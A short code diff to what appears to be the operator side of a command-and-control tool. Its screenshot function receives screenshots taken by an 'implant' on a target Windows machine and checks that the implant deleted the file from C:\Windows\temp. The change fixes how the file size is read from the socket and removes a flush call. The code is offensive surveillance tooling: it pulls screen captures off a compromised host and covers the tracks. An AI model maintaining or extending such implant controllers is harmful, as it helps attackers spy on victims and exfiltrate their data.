@@ -34,7 +34,8 @@ def screenshot(sock, filePath):
             # Get our screenshot file 
             print("Successful screenshot! Getting file size...")
 
-            data = sock.recv(1024)
+            # Only sent a DWORD worth of data here so make sure our socket doesn't start accidentally reading our file bytes...
+            data = sock.recv(4) 
 
             fileSize = int.from_bytes(data, 'little')
 
@@ -62,14 +63,12 @@ def screenshot(sock, filePath):
 
             print("Successfully wrote file to disk... awaiting implant reponse code...")
 
-            # Socket is getting extra file data and performing the check here...
             data = sock.recv(1024)
             data = data.strip()
             data = data.decode('utf-8')
 
             if (data == 'SUCCESS'):
                 print("Successful screenshot!\n")
-                sock.flush()
 
             else:
                  print("Implant failed to delete file off target! Check C:\\Windows\\temp and ensure to delete that...")
